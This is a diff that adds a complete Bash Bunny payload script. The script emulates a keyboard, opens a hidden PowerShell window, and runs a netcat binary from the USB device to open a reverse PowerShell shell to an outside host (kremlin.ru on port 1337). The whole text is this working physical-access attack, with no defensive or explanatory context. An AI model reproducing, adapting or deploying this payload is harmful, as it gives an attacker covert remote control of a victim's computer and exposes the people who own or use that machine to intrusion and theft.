@@ -1,0 +1,13 @@
+#!/bin/bash
+ATTACKMODE HID STORAGE
+
+# Starting job (purple LED)
+LED R B 0
+
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -WindowStyle Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\library\win-revshell\nc.exe') -nv kremlin.ru 1337 -e powershell.exe "
+QUACK ENTER
+
+# job complete (RED)
+LED R 100
